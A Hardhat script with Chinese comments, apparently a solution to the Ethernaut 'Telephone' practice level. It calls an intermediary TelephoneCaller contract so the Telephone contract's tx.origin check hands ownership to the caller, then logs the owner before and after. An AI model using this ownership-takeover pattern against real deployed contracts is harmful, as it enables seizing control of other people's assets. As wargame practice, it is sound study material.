import hre from "hardhat";

// 請將以下地址替換成部屬後的實例合約地址
const telephone_address = "0x45Df81613D3339C624cAD76FcD9DA5436a3c7FcD";
const telephone_caller_address = "0xe9fd1041D58C975269a0f61EF42AEdA0b3e6a63A";
console.log("目標 Telephone 實例合約地址:", telephone_address);
console.log("目標 TelephoneCaller 實例合約地址:", telephone_caller_address);

const [signer] = await hre.ethers.getSigners();
console.log("我的帳戶地址: ", signer.address);


const telephone = await hre.ethers.getContractAt("Telephone", telephone_address);
const telephone_caller = await hre.ethers.getContractAt("TelephoneCaller", telephone_caller_address);

async function main() {
    
    console.log("telephone owner: ", await telephone.owner());
    
    const tx = await telephone_caller.callTelephone();
    await tx.wait();

    console.log("Now, telephone owner: ", await telephone.owner());
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});